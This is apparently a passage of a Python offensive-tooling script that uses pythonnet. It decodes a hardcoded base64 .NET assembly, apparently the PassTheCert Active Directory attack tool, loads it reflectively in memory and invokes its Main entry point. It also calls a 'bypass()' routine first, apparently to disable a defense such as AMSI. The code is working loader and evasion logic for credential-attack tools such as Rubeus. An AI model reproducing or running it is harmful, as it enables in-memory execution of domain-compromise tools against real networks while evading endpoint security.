    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("PassTheCert.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()